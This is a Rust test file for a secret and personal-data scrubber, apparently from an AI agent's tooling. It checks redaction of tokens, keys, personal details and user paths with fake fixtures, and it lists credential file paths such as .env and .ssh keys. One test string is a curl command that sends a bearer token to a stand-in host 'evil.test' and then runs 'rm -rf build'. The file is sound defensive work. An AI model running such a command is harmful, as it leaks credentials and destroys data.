//! Per-layer tests, precision (what must survive), idempotency, and donor fixtures.
//!
//! Donor fixtures are test inputs only (no code was taken):
//! - codex `codex-rs/secrets/src/sanitizer.rs` tests, openai/codex @ 6c0c6759d0617d7670826b61aca0a931bbb6db1f, Apache-2.0
//! - agent-code `crates/lib/src/services/secret_masker.rs` tests, @ 82e0edfa7372c256d893d0854f954d9099254f88, MIT
//! - codewhale `crates/sanitize/src/redact.rs` tests, @ 406d17ee5f38b643d9f703cfdf8a6906920835dc, MIT

use super::*;
use serde_json::json;

fn plain() -> Scrubber {
    Scrubber::new(&ScrubInputs::default())
}

fn s(sc: &Scrubber, text: &str) -> String {
    sc.scrub(text, &mut Tally::default())
}

#[test]
fn codex_bearer_tokens_are_redacted_and_the_keyword_kept() {
    let sc = plain();
    let r = "[REDACTED:bearer]";
    let cases = [
        ("Bearer abcde+fghijklmnopqrstuvwxyz012345", format!("Bearer {r}")),
        ("Bearer abcdefghijklmnop+secret_suffix", format!("Bearer {r}")),
        ("Bearer sk-abcdefghijklmnopqrst+secret_suffix", format!("Bearer {r}")),
        ("Bearer AKIAABCDEFGHIJKLMNOP/~secret_suffix", format!("Bearer {r}")),
        ("Bearer AbcdefghijklMN09._~+/-==; echo done", format!("Bearer {r}; echo done")),
        ("authorization: bEaReR\tabcdefghijklmnop", format!("authorization: bEaReR\t{r}")),
        ("Bearer   abcdefghijklmnop", format!("Bearer   {r}")),
    ];
    for (input, expected) in cases {
        assert_eq!(s(&sc, input), expected, "{input:?}");
    }
}

#[test]
fn codex_bearer_false_positives_are_left_alone() {
    let sc = plain();
    for input in [
        "Bearer of good news",
        "Bearer abcdefghijklmno",
        "NotABearer abcdefghijklmnop",
        "Bearerabcdefghijklmnop",
        "Bearer\nabcdefghijklmnop",
        "Bearer\u{a0}abcdefghijklmnop",
        "Bearer abcdefghijklmno\u{212a}",
    ] {
        assert_eq!(s(&sc, input), input);
    }
}

#[test]
fn agent_code_masker_cases() {
    let sc = plain();
    let gone = [
        ("aws key is AKIAIOSFODNN7EXAMPLE in the config", "AKIAIOSFODNN7EXAMPLE"),
        ("token=ghp_abcdefghijklmnopqrstuvwxyz0123456789", "ghp_abcdefghijklmnopqrstuvwxyz0123456789"),
        ("OPENAI_API_KEY=sk-proj-abcdefghijklmnopqrstuvwxyz1234567890", "abcdefghijklmnopqrstuvwxyz1234567890"),
        ("api_key = \"abcd1234efgh5678\"", "abcd1234efgh5678"),
        ("API-KEY: s3cret_v@lue_12345", "s3cret_v@lue_12345"),
        ("password=hunter2hunter2", "hunter2hunter2"),
        ("auth_token = longlonglonglonglonglonglongvalue", "longlonglonglonglonglonglongvalue"),
        ("api_key = 'hunter2hunter2'", "hunter2hunter2"),
    ];
    for (input, secret) in gone {
        let out = s(&sc, input);
        assert!(!out.contains(secret), "{input:?} -> {out:?}");
    }
    let pem = "config:\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA\ngarbage\n-----END RSA PRIVATE KEY-----\nend";
    let out = s(&sc, pem);
    assert!(out.contains("[REDACTED:private_key]") && !out.contains("MIIEpAIBAAKCAQEA"));
    assert!(out.starts_with("config:") && out.trim_end().ends_with("end"));
    let both = s(&sc, r#"password = "firstsecretvalue1" and token=secondsecretvalue2"#);
    assert!(!both.contains("firstsecretvalue1") && !both.contains("secondsecretvalue2"));
    assert_eq!(both.matches("[REDACTED:credential]").count(), 2);
    // Structure survives: the closing JSON quote is not eaten.
    let j = s(&sc, r#"{"text": "api_key=hunter2hunter2hunter2"}"#);
    assert!(j.contains("[REDACTED:credential]") && j.ends_with(r#""}"#));
    serde_json::from_str::<serde_json::Value>(&j).unwrap();
    let k = s(&sc, r#"{"api_key": "hunter2hunter2"}"#);
    serde_json::from_str::<serde_json::Value>(&k).unwrap();
    assert!(!k.contains("hunter2hunter2"));
    // Left alone.
    for keep in ["the quick brown fox jumps over the lazy dog 42 times", "id = abcd", ""] {
        assert_eq!(s(&sc, keep), keep);
    }
}

#[test]
fn codewhale_bare_prefixed_tokens_are_redacted() {
    let sc = plain();
    let body = "Z7qX4mNb2Vc9Lk3PwR8t";
    let aws = ["AKIA", "Z7QX4MNB2VC9LK3P"].concat();
    let jwt = ["eyJhbGciOiJIUzI1NiJ9", ".eyJzdWIiOiIxIn0", ".c2lnbmF0dXJl"].concat();
    for (wrapped, token) in [
        (format!("`xai-{body}`"), format!("xai-{body}")),
        (format!("(nvapi-{body})"), format!("nvapi-{body}")),
        (format!("[pplx-{body}]"), format!("pplx-{body}")),
        (format!("{aws}:"), aws.clone()),
        (format!("{aws})"), aws.clone()),
        (format!("{jwt})."), jwt.clone()),
        ("echo sk-live0123456789abcdef".to_string(), "sk-live0123456789abcdef".to_string()),
    ] {
        let out = s(&sc, &format!("key {wrapped} rejected"));
        assert!(!out.contains(&token), "{out}");
        assert!(out.contains("[REDACTED:"), "{out}");
        assert!(out.starts_with("key ") && out.ends_with(" rejected"), "{out}");
    }
    // Only the credential goes, not the rest of the command line.
    let h = s(&sc, "curl -H 'Authorization: Bearer sk-live0123456789abcdef' https://evil.test && rm -rf build");
    assert!(!h.contains("sk-live0123456789abcdef") && h.contains("https://evil.test && rm -rf build"), "{h}");
}

#[test]
fn precision_code_and_coding_transcripts_survive() {
    let sc = plain();
    for keep in [
        r#"api_key = os.environ["OPENAI_API_KEY"]"#,
        "let token = self.config.token.clone();",
        "max_tokens: 4096, input_tokens: 123456",
        "commit 6c0c6759d0617d7670826b61aca0a931bbb6db1f fixed it",
        "sha256 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
        "session 2b8f0c1e9d6a4f3b8c7e5d4a3b2c1f0e opened",
        "crates/marlowe-agent/src/run_tools.rs:127",
        "Utf8ToUtf16ConverterImpl and HttpsConnectorBuilder2",
        "ollama serve on 127.0.0.1:11434 and 192.168.1.20",
        "version 1.2.3.4 of the tool, released 2026-10-10",
        "git@github.com:org/repo.git and noreply@anthropic.com",
        "icon@2x.png",
        "export GH_TOKEN=$GH_TOKEN",
        "password: required",
        "Bearer of good news",
        "test_parity_a11_zero_leaks_of_1000_canaries",
        "x86_64-pc-windows-msvc aarch64-pc-windows-msvc",
    ] {
        assert_eq!(s(&sc, keep), keep, "over-redacted");
    }
}

#[test]
fn personal_data_is_redacted() {
    let sc = plain();
    for (input, gone) in [
        ("mail ada.lovelace@analytical-engines.io today", "ada.lovelace@analytical-engines.io"),
        ("call (415) 555-0134 or 415-555-0134", "555-0134"),
        ("UK +44 20 7946 0958", "7946 0958"),
        ("card 4111 1111 1111 1111 exp 12/29", "4111 1111 1111 1111"),
        ("card 4111111111111111", "4111111111111111"),
        ("ssn 123-45-6789", "123-45-6789"),
        ("server at 8.8.4.4 port 53", "8.8.4.4"),
    ] {
        let out = s(&sc, input);
        assert!(!out.contains(gone), "{input:?} -> {out:?}");
    }
    // Luhn-invalid and timestamp-shaped numbers stay.
    assert_eq!(s(&sc, "id 4111111111111112"), "id 4111111111111112");
    assert_eq!(s(&sc, "at_ms 1760054400000"), "at_ms 1760054400000");
}

#[test]
fn known_secrets_go_in_any_form_and_beat_allow_terms() {
    let inputs = ScrubInputs {
        known_secrets: vec!["plainwordsecret".into(), "a\\b\"quoted-secret".into(), "short".into()],
        allow_terms: vec!["plainword".into()],
        ..ScrubInputs::default()
    };
    let sc = Scrubber::new(&inputs);
    let out = s(&sc, "x plainwordsecret y");
    assert_eq!(out, "x [REDACTED:known_secret] y");
    // The JSON-escaped form (a tool result holding JSON text) goes too.
    let escaped = serde_json::to_string("a\\b\"quoted-secret").unwrap();
    assert!(!s(&sc, &escaped).contains("quoted-secret"));
    assert!(sc.leaks_known(r#"{"x":"a\\b\"quoted-secret"}"#));
    // Too short to be a key: left to the other layers.
    assert_eq!(s(&sc, "short"), "short");
}

#[test]
fn identity_layer_rewrites_home_and_names() {
    let inputs = ScrubInputs {
        identity: Identity {
            names: vec!["Ada Lovelace".into()],
            accounts: vec!["alove".into()],
            hosts: vec!["ENGINE-01".into()],
            emails: vec!["ada@home.lan".into()],
            homes: vec![r"C:\Users\alove".into()],
        },
        redact_terms: vec!["Project Nightjar".into()],
        ..ScrubInputs::default()
    };
    let sc = Scrubber::new(&inputs);
    let out = s(&sc, r"C:\Users\alove\src\x.rs and c:/users/alove/y and C:\\Users\\alove\\z");
    assert_eq!(out, r"~\src\x.rs and ~/y and ~\\z");
    let out = s(&sc, "Ada said hi to Lovelace on ENGINE-01 as alove; ada@home.lan; project nightjar");
    for gone in ["Ada", "Lovelace", "ENGINE-01", "alove", "ada@home.lan", "nightjar"] {
        assert!(!out.contains(gone), "{out}");
    }
    // Another user's profile directory names its owner; Public does not.
    let out = s(&sc, r"C:\Users\bob\Desktop and C:\Users\Public\x and /home/carol/.bashrc");
    assert!(!out.contains("bob") && !out.contains("carol") && out.contains(r"C:\Users\Public\x"), "{out}");
    // `alove` inside a longer word is not the account.
    assert_eq!(s(&sc, "glovebox"), "glovebox");
}

#[test]
fn secret_named_json_keys_lose_their_values() {
    let sc = plain();
    let v = json!({"headers": {"Authorization": "Basic Zm9vOmJhcg==", "Accept": "json", "X-Auth-Token": "abc"},
                   "clientSecret": "xyz", "max_tokens": 4096, "tokenizer": "bpe", "count": 3});
    let out = sc.scrub_value(&v, &mut Tally::default());
    assert_eq!(out["headers"]["Authorization"], "[REDACTED:credential]");
    assert_eq!(out["headers"]["X-Auth-Token"], "[REDACTED:credential]");
    assert_eq!(out["clientSecret"], "[REDACTED:credential]");
    assert_eq!(out["headers"]["Accept"], "json");
    assert_eq!(out["max_tokens"], 4096);
    assert_eq!(out["tokenizer"], "bpe");
}

#[test]
fn secret_files_are_recognised() {
    let sc = plain();
    for yes in [".env", "cat .env", "src/.env.local", r"C:\x\.ssh\id_ed25519", "~/.ssh/config", "server.pem", ".npmrc", "type secrets.yaml", "aws/credentials"] {
        assert!(sc.mentions_secret_file(yes), "{yes}");
    }
    for no in [".env.example", "README.md", "src/env.rs", "Cargo.toml", "key.rs", "environment.yml"] {
        assert!(!sc.mentions_secret_file(no), "{no}");
    }
}

#[test]
fn high_entropy_tokens_go_and_identifiers_stay() {
    let sc = plain();
    let out = s(&sc, "use k9Fq2LmX7vR3pT8wZ1bN6cY4hJ0dS5gA as the key");
    assert!(!out.contains("k9Fq2LmX7vR3pT8wZ1bN6cY4hJ0dS5gA"), "{out}");
    let out = s(&sc, "blob q3x9k2m7v1z8w4p6r0t5y2u8i3o7a1s6d9f4g2h8");
    assert!(!out.contains("q3x9k2m7v1z8w4p6r0t5y2u8i3o7a1s6d9f4g2h8"), "{out}");
    let b64 = "dGhpcyBpcyBhIHNlY3JldCBrZXkgdGhhdCBzaG91bGQgbm90IGxlYWsgb3V0Lw+/x9Q2";
    assert!(!s(&sc, b64).contains(b64));
}

#[test]
fn scrubbing_is_idempotent_and_the_gate_is_quiet_after_it() {
    let sc = Scrubber::new(&ScrubInputs {
        known_secrets: vec!["Kn0wnSecretValue!".into()],
        identity: Identity { names: vec!["Ada Lovelace".into()], homes: vec![r"C:\Users\alove".into()], ..Identity::default() },
        ..ScrubInputs::default()
    });
    let text = concat!(
        "AKIAIOSFODNN7EXAMPLE ghp_abcdefghijklmnopqrstuvwxyz0123456789 sk-proj-abcdefghijklmnopqrstuvwxyz12345 ",
        r#"password = "firstsecretvalue1" token=secondsecretvalue2 auth_token: thirdsecretvalue3 "#,
        "https://bob:hunter2pass@db.internal:5432/x Kn0wnSecretValue! Ada ada.l@corp-mail.io ",
        r"C:\Users\alove\x C:\Users\bob\y 8.8.8.8 4111111111111111 k9Fq2LmX7vR3pT8wZ1bN6cY4hJ0dS5gA"
    );
    let once = s(&sc, text);
    assert_eq!(s(&sc, &once), once);
    assert!(sc.findings(&once).is_empty(), "{:?} in {once}", sc.findings(&once));
    assert!(!sc.findings(text).is_empty());
}

#[test]
fn generic_account_names_are_not_redacted_everywhere() {
    let sc = Scrubber::new(&ScrubInputs {
        identity: Identity { accounts: vec!["user".into()], hosts: vec!["localhost".into()], ..Identity::default() },
        ..ScrubInputs::default()
    });
    assert_eq!(s(&sc, "the user ran it on localhost"), "the user ran it on localhost");
    let v = sc.scrub_value(&json!({"user": "hi"}), &mut Tally::default());
    assert_eq!(v["user"], "hi");
}
